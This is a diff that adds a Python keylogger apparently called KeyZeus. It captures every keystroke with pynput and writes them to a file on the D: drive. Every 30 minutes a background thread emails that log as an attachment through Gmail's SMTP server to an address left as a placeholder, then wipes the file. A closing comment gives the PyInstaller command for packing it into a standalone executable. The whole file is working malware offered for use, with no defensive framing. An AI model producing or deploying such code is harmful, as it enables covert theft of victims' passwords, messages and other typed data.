@@ -1,0 +1,83 @@
+from pynput import keyboard as kb
+import os
+import time
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from smtplib import SMTP
+from threading import Thread
+
+
+
+tecla=""
+print("""
+
+                                                    █░█ █▀▀ █░█ ▀▀█ █▀▀ █░░█ ▄▀▀ .
+                                                    █▀▄ █▀▀ ▀█▀ ▄▀░ █▀▀ █░░█ ░▀▄ .
+                                                    ▀░▀ ▀▀▀ ░▀░ ▀▀▀ ▀▀▀ ░▀▀░ ▀▀░ .
+
+Working..""")
+
+
+
+def pulsa(tecla,file = open("D:\Data_KeyZeus.txt", "a")):
+
+    if str(tecla)!= "Key.space":
+        if str(tecla)!="Key.enter":
+            if len(str(tecla))>5:
+                file.write("  ")
+                file.write(str(tecla).replace("'",""))
+                file.write("  ")
+            else:
+                file.write(str(tecla).replace("'",""))
+        else:
+            file.write(os.linesep)
+    
+    else:
+        file.write(" ")
+
+    
+    if str(tecla)== "Key.esc":
+        file.close()
+        os._exit(0)
+    if "key." in str(tecla):
+        file.write("     ")
+
+
+     
+    file.flush()
+    
+    
+
+
+def Guardar_Enviar(file = open("D:\Data_KeyZeus.txt","r")):
+    while True:
+        time.sleep(1800)
+        mensaje = MIMEMultipart("plain")
+        mensaje["From"]="TU_CORREO_SALIDA"
+        mensaje["To"]= "TU_CORREO_DE_LLEGADA"
+        mensaje["Subject"] ="Data Keylogger"
+        adjunto = MIMEBase("application","octect-stream")
+        adjunto.set_payload(open("D:\Data_KeyZeus.txt","rb").read())
+        adjunto.add_header("content-Disposition",'attachment; filename="Data_KeyZeus.txt"')
+        mensaje.attach(adjunto)
+        smtp = SMTP("smtp.gmail.com")
+        smtp.starttls()
+        smtp.login("TU_CORREO","TU_CONTRASEÑA")
+        smtp.sendmail("TU_CORREO_SALIDA","CORREO_DE_LLEGADA",mensaje.as_string())
+        smtp.quit()
+        file = open("D:\Data_KeyZeus.txt","w")
+        file.close()
+        print("Actualizacion enviada....")
+
+
+def worker():
+    
+    Guardar_Enviar()
+    
+
+t = Thread(target=worker)
+t.start()
+with kb.Listener(pulsa) as escuchador:
+	escuchador.join()
+
+#py -3.9 -m PyInstaller --onefile KeyZeus.py 
